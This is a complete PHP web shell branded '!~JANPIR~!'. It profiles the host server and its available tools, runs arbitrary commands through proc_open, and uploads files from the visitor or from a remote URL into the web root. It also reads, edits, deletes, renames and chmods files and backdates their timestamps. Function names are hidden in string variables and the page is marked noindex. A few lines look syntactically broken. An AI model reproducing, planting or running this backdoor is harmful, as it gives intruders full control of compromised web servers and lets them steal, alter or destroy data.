<!DOCTYPE html>
<html>
<head>
	<?php echo "<title>!~JANPIR~!</title>"; ?>
	<meta name="robots" content="noindex">
	<link rel="icon" href="https://png.pngtree.com/png-clipart/20210321/original/pngtree-anonymous-in-a-hood-red-concept-vector-png-image_6109862.jpg" type="image/x-icon">
</head>
<body bgcolor="#1f1f1f" text="#ffffff">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
	@import url('https://fonts.googleapis.com/css?family=Dosis');
	@import url('https://fonts.googleapis.com/css?family=Bungee');
	@import url('https://fonts.googleapis.com/css?family=Russo+One');
body {
	font-family: "Dosis", cursive;
	text-shadow:0px 0px 1px #757575;
}

body::-webkit-scrollbar {
  width: 12px;
}

body::-webkit-scrollbar-track {
  background: #1f1f1f;
}

body::-webkit-scrollbar-thumb {
  background-color: #1f1f1f;
  border: 3px solid gray;
}

#content tr:hover {
	background-color: #636263;
	text-shadow:0px 0px 10px #fff;
}

#content .first {
	background-color: #25383C;
}

#content .first:hover {
		background-color: #25383C;
		text-shadow: 0px 0px 1px #757575;
}

table {
	border: 1px #000000 dotted;
	table-layout: fixed;
}

td {
	word-wrap: break-word;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: #000000;
	text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
	border: 1px #000000 solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
}

.gas {
	background-color: #1f1f1f;
	color: #ffffff;
	cursor: pointer;
}

select {
	background-color: transparent;
	color: #ffffff;
}

select:after {
	cursor: pointer;
}

.linka {
	background-color: transparent;
	color: #ffffff;
}

.up {
	background-color: transparent;
	color: #fff;
}

option {
	background-color: #1f1f1f;
}

.btf {
	background: transparent;
	border: 1px #fff solid;
	cursor: pointer;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
</style>
<center>
<?php
echo '<font face="Bungee" size="5">!~JANPIR~!</font></center>
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';
set_time_limit(0);
error_reporting(0);

$gcw = "getcwd";
$exp = "explode";
$fpt = "file_put_contents";
$fgt = "file_get_contents";
$sts = "stripslashes";
$scd = "scandir";
$fxt = "file_exists";
$idi = "is_dir";
$ulk = "unlink";
$ifi = "is_file";
$sub = "substr";
$spr = "sprintf";
$fp = "fileperms";
$chm = "chmod";
$ocd = "octdec";
$isw = "is_writable";
$idr = "is_dir";
$ird = "is_readable";
$isr = "is_readable";
$fsz = "filesize";
$rd = "round";
$igt = "ini_get";
$fnct = "function_exists";
$rad = "REMOTE_ADDR";
$rpt = "realpath";
$bsn = "basename";
$srl = "str_replace";
$sps = "strpos";
$mkd = "mkdir";

$wb = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://".$_SERVER['HTTP_HOST'];

$disfunc = @$igt("disable_functions");
if (empty($disfunc)) {
	$disf = "<font color='gold'>NONE</font>";
} else {
	$disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
	echo "<center><br>Janda Pirang<br>1928</center>";
	exit();
}

function cekdir() {
	if (isset($_GET['path'])) {
		$tokber = $_GET['path'];
	} else {
		$tokber = "getcwd";
		$tokber = $tokber();
	}
	$b = "is_writable";
	if ($b($tokber)) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function crt() {
	$a = "is_writable";
	if ($a($_SERVER['DOCUMENT_ROOT'])) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function xrd($lokena) {
	$a = "scandir";
    $items = $a($lokena);
    foreach ($items as $item) {
        if ($item ===  || $item === '..') {
            continue;
        }
        $b = "is_dir";
        $path = $lokena.'/'.$item;
        if ($b($path)) {
            xrd($path);
        } else {
        	$c = "unlink";
            $c($path);
        }
    }
    $d = "rmdir";
    $d($lokena);
}

function cfn($fl) {
	$a = "basename";
	$b = "pathinfo";
	$c = $b($a($fl), PATHINFO_EXTENSION);
	if ($c == "zip") {
		return '<i class="fa fa-file-zip-o" style="color: #d6d4ce"></i>';
	} elseif (preg_match("/jpeg|jpg|png|ico/im", $c)) {
		return '<i class="fa fa-file-image-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "txt") {
		return '<i class="fa fa-file-text-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "pdf") {
		return '<i class="fa fa-file-pdf-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "html") {
		return '<i class="fa fa-file-code-o" style="color: #d6d4ce"></i>';
	}
	else {
		return '<i class="fa fa-file-o" style="color: #d6d4ce"></i>';
	}
}

function ipsrv() {
	$a = "gethostbyname";
	$b = "function_exists";
	$c = "SERVER_ADDR";
	$d = "SERVER_NAME";
	if ($b($a)) {
		return $a($_SERVER[$d]);
	} else {
		return $a($_SERVER[$c]);
	}
}

function ggr($fl) {
	$a = "function_exists";
	$b = "posix_getgrgid";
	$c = "filegroup";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function gor($fl) {
	$a = "function_exists";
	$b = "posix_getpwuid";
	$c = "fileowner";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function fdt($fl) {
	$a = "date";
	$b = "filemtime";
    return $a("F d Y H:i:s", $b($fl));
}

function dunlut($fl) {
	$a = "file_exists";
	$b = "basename";
	$c = "filesize";
	$d = "readfile";
	if ($a($fl) && isset($fl)) {
		header('Content-Description: File Transfer');
		header("Content-Control:public");
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename="'.$b($fl).'"');
		header('Expires: 0');
		header("Expired:0");
		header('Cache-Control: must-revalidate');
		header("Content-Transfer-Encoding:binary");
		header('Pragma: public');
		header('Content-Length: ' .$c($fl));
		flush();
		$d($fl);
		exit;
	} else {
		return "File Not Found !";
	}
}

function komend($kom, $lk) {
	$x = "preg_match";
	$xx = "2>&1";
	if (!$x("/".$xx."/i", $kom)) {
		$kom = $kom." ".$xx;
	}
	$a = "function_exists";
	$b = "proc_open";
	$c = "htmlspecialchars";
	$d = "stream_get_contents";
	if ($a($b)) {
		$ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
		return "<pre>".$c($d($meki[1]))."</pre>";
	} else {
		return "proc_open function is disabled !";
	}
}

function green($text) {
	echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
	echo "<center><font color='red'>".$text."</center></font>";
}

function oren($text) {
	return "<center><font color='orange'>".$text."</center></font>";
}

function tuls($nm, $lk) {
	return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}

echo "Server IP : <font color=gold>".ipsrv()."</font> &nbsp;/&nbsp; Your IP : <font color=gold>".$_SERVER[$rad]."</font><br>";
echo "Web Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
$unm = "php_uname";
echo "System : <font color='gold'>".@$unm()."</font><br>";
$gcu = "get_current_user";
$gmu = "getmyuid";
echo "User : <font color='gold'>".@$gcu()."&nbsp;</font>( <font color='gold'>".@$gmu()."</font>)<br>";
$phv = "phpversion";
echo "PHP Version : <font color='gold'>".@$phv()."</font><br>";
echo "Disable Function : ".$disf."</font><br>";
echo "MySQL : ";
if (@$fnct("mysql_connect")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; cURL : ";
if (@$fnct("curl_init")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; WGET : ";
if (@$fxt("/usr/bin/wget")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Perl : ";
if (@$fxt("/usr/bin/perl")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Python : ";
if (@$fxt("/usr/bin/python2")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Sudo : ";
if (@$fxt("/usr/bin/sudo")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pkexec : ";
if (@$fxt("/usr/bin/pkexec")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo "<br>Directory : &nbsp;";

foreach($_POST as $key => $value){
	$_POST[$key] = $sts($value);
}

if(isset($_GET['path'])){
	$tokber = $_GET['path'];
	$lokdua = $_GET['path'];
} else {
	$tokber = $gcw();
	$lokdua = $gcw();
}

$tokber = $srl('\\','/',$tokber);
$tokbers = $exp('/',$tokber);
$tokbernya = @$scd($tokber);

foreach($tokbers as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?path=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?path=';
	for($i=0;$i<=$id;$i++){
	echo "$tokbers[$i]";
	if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}

echo '</td></tr><tr><td><br>';
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		if ($_POST['dirnya'] == "2") {
			$tokber = $_SERVER['DOCUMENT_ROOT'];
		}
		if (empty($_FILES['berkas']['name'])) {
			echo "<font color=orange>File not Selected !</font><br><br>";
		} else {
			$data = @$fpt($tokber."/".$_FILES['berkas']['name'], @$fgt($_FILES['berkas']['tmp_name']));
				if ($fxt($tokber."/".$_FILES['berkas']['name'])) {
					$fl = $tokber."/".$_FILES['berkas']['name'];
					echo "File Uploaded ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
					if ($sps($tokber, $_SERVER['DOCUMENT_ROOT']) !== false) {
						$lwb = $srl($_SERVER['DOCUMENT_ROOT'], $wb."/", $fl);
						echo "Link : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
					}
					echo "<br>";
				} else {
					echo "<font color='red'>Failed to Upload !</font><br><br>";
			}
		}
	} elseif (isset($_POST['linknya'])) {
		if (empty($_POST['namalink'])) {
			echo "<font color=orange>Filename cannot be empty !</font><br><br>";
		} elseif (empty($_POST['darilink'])) {
			echo "<font color=orange>Link cannot be empty !</font><br><br>";
		} else {
			if ($_POST['dirnya'] == "2") {
			$tokber = $_SERVER['DOCUMENT_ROOT'];
			}
				$data = @$fpt($tokber."/".$_POST['namalink'], @$fgt($_POST['darilink']));
				if ($fxt($tokber."/".$_POST['namalink'])) {
					$fl = $tokber."/".$_POST['namalink'];
					echo "File Uploaded ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
					if ($sps($tokber, $_SERVER['DOCUMENT_ROOT']) !== false) {
						$lwb = $srl($_SERVER['DOCUMENT_ROOT'], $wb."/", $fl);
						echo "Link : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
					}
					echo "<br>";
				} else {
					echo "<font color='red'>Failed to Upload !</font><br><br>";
				}
		}
	}
}

echo "Upload File : ";
echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.crt().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
<input type="text" name="darilink" class="up" placeholder="https://anokm.co/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
echo '<br><form method="post" enctype="application/x-www-form-urlencoded">
Command : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="'.htmlspecialchars($_POST['komend']).'">
<input type="submit" name="komends" value=">>" class="up" style="cursor: pointer; border-color: #fff">
</form>';
echo "</table><br>";

echo '<hr><center style="font-family: Russo One">';
echo tuls("HOME", $_SERVER['SCRIPT_NAME']);
//echo tuls("HOME");
echo "<hr></center><br>";

if (isset($_GET['pirang'])) {
	echo "<tr><td>Current File : ".$_GET['pirang'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars($fgt($_GET['pirang']))."</pre>";
	author();
} elseif (isset($_POST['path']) && $_POST['pilih'] == "hapus") {
	if ($idi($_POST['path']) && $fxt($_POST['path'])) {
		xrd($_POST['path']);
		if ($fxt($_POST['path'])) {
			red("Failed to delete Directory !");
		} else {
			green("Delete Directory Success !");
		}
	} elseif ($ifi($_POST['path']) && $fxt($_POST['path'])) {
		@$ulk($_POST['path']);
		if ($fxt($_POST['path'])) {
			red("Failed to Delete File !");
		} else {
			green("Delete File Success !");
		}
	} else {
		red("File / Directory not Found !");
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
	if (!isset($_POST['cemod'])) {
		if ($_POST['type'] == "file") {
			echo "<center>File : ".htmlspecialchars($_POST['path'])."<br>";
		} else {
			echo "<center>Dir : ".htmlspecialchars($_POST['path'])."<br>";
		}
		echo '<form method="post">
		Permission : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['path'])), -4).'" />
		<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="hidden" name="pilih" value="ubahmod">';
		if ($_POST['type'] == "file") {
			echo '<input type="hidden" name="type" value="file">';;
		} else {
			echo '<input type="hidden" name="type" value="dir">';;
		}
		echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	} else {
		$cm = @$chm($_POST['path'], $ocd($_POST['perm']));
		if ($cm == true) {
			green("Change Mod Success !");
			if ($_POST['type'] == "file") {
				echo "<center>File : ".htmlspecialchars($_POST['path'])."<br>";
			} else {
				echo "<center>Dir : ".htmlspecialchars($_POST['path'])."<br>";
			}
			echo '<form method="post">
			Permission : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['path'])), -4).'" />
			<input type="hidden" name="path" value="'.$_POST['path'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['type'] == "file") {
				echo '<input type="hidden" name="type" value="file">';;
			} else {
				echo '<input type="hidden" name="type" value="dir">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Mod Failed !");
			if ($_POST['type'] == "file") {
				echo "<center>File : ".htmlspecialchars($_POST['path'])."<br>";
			} else {
				echo "<center>Dir : ".htmlspecialchars($_POST['path'])."<br>";
			}
			echo '<form method="post">
			Permission : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['path'])), -4).'" />
			<input type="hidden" name="path" value="'.$_POST['path'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['type'] == "file") {
				echo '<input type="hidden" name="type" value="file">';;
			} else {
				echo '<input type="hidden" name="type" value="dir">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		}
	}
} elseif (isset($_POST['path']) && $_POST['pilih'] == "ubahnama") {
	if (isset($_POST['gantin'])) {
		$namabaru = $_GET['path']."/".$_POST['newname'];
		$ceen = "rename";
		if (@$ceen($_POST['path'], $namabaru) === true) {
			green("Change Name Success");
			if ($_POST['type'] == "file") {
				echo "<center>File : ".htmlspecialchars($_POST['path'])."<br>";
			} else {
				echo "<center>Dir : ".htmlspecialchars($_POST['path'])."<br>";
			}
			echo '<form method="post">
			New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($_POST['newname']).'" />
			<input type="hidden" name="path" value="'.$_POST['newname'].'">
			<input type="hidden" name="pilih" value="ubahnama">';
			if ($_POST['type'] == "file") {
				echo '<input type="hidden" name="type" value="file">';;
			} else {
				echo '<input type="hidden" name="type" value="dir">';;
			}
			echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Name Failed");
		}
	} else {
		if ($_POST['type'] == "file") {
			echo "<center>File : ".htmlspecialchars($_POST['path'])."<br>";
		} else {
			echo "<center>Dir : ".htmlspecialchars($_POST['path'])."<br>";
		}
		echo '<form method="post">
		New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($bsn($_POST['path'])).'" />
		<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="hidden" name="pilih" value="ubahnama">';
		if ($_POST['type'] == "file") {
			echo '<input type="hidden" name="type" value="file">';;
		} else {
			echo '<input type="hidden" name="type" value="dir">';;
		}
		echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
	if (isset($_POST['gasedit'])) {
		$edit = @$fpt($_POST['path'], $_POST['src']);
		if ($fgt($_POST['path']) == $_POST['src']) {
			green("Edit File Success !");
		} else {
			red("Edit File Failed !");
		}
	}
	echo "<center>File : ".htmlspecialchars($_POST['path'])."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars($fgt($_POST['path'])).'</textarea><br>
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="edit">
	<input type="submit" value="Edit File" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/>
	</form><br>';
} elseif (isset($_POST['komends'])) {
	if (isset($_POST['komend'])) {
		if (isset($_GET['path'])) {
			$lk = $_GET['path'];
		} else {
			$lk = $gcw();
		}
		$km = 'komend';
		echo $km($_POST['komend'], $lk);
		exit();
	}
} elseif (isset($_POST['path']) && $_POST['pilih'] == "ubahtanggal") {
	if (isset($_POST['tanggale'])) {
		$stt = "strtotime";
		$tch = "touch";
		$tanggale = $stt($_POST['tanggal']);
		if (@$tch($_POST['path'], $tanggale) === true) {
			green("Change Date Success !");
			$det = "date";
			$ftm = "filemtime";
			$b = $det("d F Y H:i:s", $ftm($_POST['path']));
			if ($_POST['type'] == "file") {
				echo "<center>File : ".htmlspecialchars($_POST['path'])."<br>";
			} else {
				echo "<center>Dir : ".htmlspecialchars($_POST['path'])."<br>";
			}
			echo '<form method="post">
			New Date : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
			<input type="hidden" name="path" value="'.$_POST['path'].'">
			<input type="hidden" name="pilih" value="ubahtanggal">';
			if ($_POST['type'] == "file") {
				echo '<input type="hidden" name="type" value="file">';;
			} else {
				echo '<input type="hidden" name="type" value="dir">';;
			}
			echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Failed to Change Date !");
		}
	} else {
		$det = "date";
		$ftm = "filemtime";
		$b = $det("d F Y H:i:s", $ftm($_POST['path']));
		if ($_POST['type'] == "file") {
			echo "<center>File : ".htmlspecialchars($_POST['path'])."<br>";
		} else {
			echo "<center>Dir : ".htmlspecialchars($_POST['path'])."<br>";
		}
		echo '<form method="post">
		New Date : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
		<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="hidden" name="pilih" value="ubahtanggal">';
		if ($_POST['type'] == "file") {
			echo '<input type="hidden" name="type" value="file">';;
		} else {
			echo '<input type="hidden" name="type" value="dir">';;
		}
		echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_POST['path']) && $_POST['pilih'] == "dunlut") {
	$dunlute = $_POST['path'];
	if ($fxt($dunlute) && isset($dunlute)) {
		if ($ird($dunlute)) {
			dunlut($dunlute);
		} elseif ($idr($fl)) {
			red("That is Directory, Not File -_-");
		} else {
			red("File is Not Readable !");
		}
	} else {
		red("File Not Found !");
	}
} elseif (isset($_POST['path']) && $_POST['pilih'] == "folder") {
    if ($isw("./") || $ird("./")) {
        $loke = $_POST['path'];
        if (isset($_POST['buatfolder'])) {
            $buatf = $mkd($loke."/".$_POST['folderbaru']);
            if ($buatf == true) {
                green("Folder <b>".htmlspecialchars($_POST['folderbaru'])."</b> Created !");
                echo '<form method="post"><center>Folder : <input type="text" name="folderbaru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="path" value="'.$_POST['path'].'">
                <input type="hidden" name="pilih" value="folder"></form>';
            } else {
                red("Failed to Create folder !");
                echo '<form method="post"><center>Folder : <input type="text" name="folderbaru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="path" value="'.$_POST['path'].'">
                <input type="hidden" name="pilih" value="folder"></form>';
            }
        } else {
            echo '<form method="post"><center>Folder : <input type="text" name="folderbaru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="pilih" value="folder"></form>';
        }
    }
} elseif (isset($_POST['path']) && $_POST['pilih'] == "file") {
    if ($isw("./") || $isr("./")) {
        $loke = $_POST['path'];
        if (isset($_POST['buatfile'])) {
            $buatf = $fpt($loke."/".$_POST['filebaru'], "");
            if ($fxt($loke."/".$_POST['filebaru'])) {
                green("File <b>".htmlspecialchars($_POST['filebaru'])."</b> Created !");
                echo '<form method="post"><center>Filename : <input type="text" name="filebaru" class="up"> <input type="submit" name="buatfile" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="path" value="'.$_POST['path'].'">
                <input type="hidden" name="pilih" value="file"></form>';
            } else {
                red("Failed to Create File !");
                echo '<form method="post"><center>Filename : <input type="text" name="filebaru" class="up"> <input type="submit" name="buatfile" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="path" value="'.$_POST['path'].'">
                <input type="hidden" name="pilih" value="file"></form>';
            }
        } else {
            echo '<form method="post"><center>Filename : <input type="text" name="filebaru" class="up"> <input type="submit" name="buatfile" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="pilih" value="file"></form>';
        }
    }
}

echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Last Modified</center></td>
<td><center>Owner / Group</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

echo "<tr>";
$auutolkw = $srl($bsn($tokber), "", $tokber);
$auutolkw = $srl("//", "/", $auutolkw);
echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?path=".$auutolkw."\">..</a></td>
<td><center>--</center></td>
<td><center>".fdt($auutolkw)."</center></td>
<td><center>".gor($auutolkw)." / ".ggr($auutolkw)."</center></td>
<td><center>";
if($isw($auutolkw)) echo '<font color="green">';
elseif(!$isr($auutolkw)) echo '<font color="red">';
echo statusnya($auutolkw);
if($isw($auutolkw) || !$isr($auutolkw)) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?pilihan&path=$tokber\">
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$coldo\">
<input type=\"hidden\" name=\"path\" value=\"$tokber/$coldo\">
<button type='submit' class='btf' name='pilih' value='folder'><i class='fa fa-folder' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='file'><i class='fa fa-file' style='color: #fff'></i></button>
</form></center>";
echo "</tr>";

foreach($tokbernya as $coldo){
	$auutol = $tokber."/".$coldo;
	$auutol = $srl("//", "/", $auutol);
	if(!$idi($auutol) || $coldo ==  || $coldo == '..') continue;
	echo "<tr>";
	echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?path=".$auutol."\">".$coldo."</a></td>
	<td><center>--</center></td>
	<td><center>".fdt($auutol)."</center></td>
	<td><center>".gor($auutol)." / ".ggr($auutol)."</center></td>
	<td><center>";
	if($isw($auutol)) echo '<font color="green">';
	elseif(!$isr($auutol)) echo '<font color="red">';
	echo statusnya($auutol);
	if($isw($auutol) || !$isr($auutol)) echo '</font>';

	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?pilihan&path=$tokber\">
	<input type=\"hidden\" name=\"type\" value=\"dir\">
	<input type=\"hidden\" name=\"name\" value=\"$coldo\">
	<input type=\"hidden\" name=\"path\" value=\"$tokber/$coldo\">
	<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
	</form></center></td>
	</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
$skd = "1024";
foreach($tokbernya as $dupir) {
	$juanda = $tokber."/".$dupir;
	if(!$ifi("$tokber/$dupir")) continue;
	$size = $fsz("$tokber/$dupir")/$skd;
	$size = $rd($size,3);
	if($size >= $skd){
	$size = $rd($size/$skd,2).' MB';
} else {
	$size = $size.' KB';
}

echo "<tr>
<td>".cfn($juanda)." <a href=\"?pirang=$tokber/$dupir&path=$tokber\">$dupir</a></td>
<td><center>".$size."</center></td>
<td><center>".fdt($juanda)."</center></td>
<td><center>".gor($juanda)." / ".ggr($juanda)."</center></td>
<td><center>";
if($isw("$tokber/$dupir")) echo '<font color="green">';
elseif(!$isr("$tokber/$dupir")) echo '<font color="red">';
echo statusnya("$tokber/$dupir");
if($isw("$tokber/$dupir") || !$isr("$tokber/$dupir")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&path=$tokber\">
<button type='submit' class='btf' name='pilih' value='edit'><i class='fa fa-edit' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='dunlut'><i class='fa fa-download' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$dupir\">
<input type=\"hidden\" name=\"path\" value=\"$tokber/$dupir\">
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($fl){
	$a = "substr";
	$b = "sprintf";
	$c = "fileperms";
$izin = $a($b('%o', $c($fl)), -4);
return $izin;
}
?>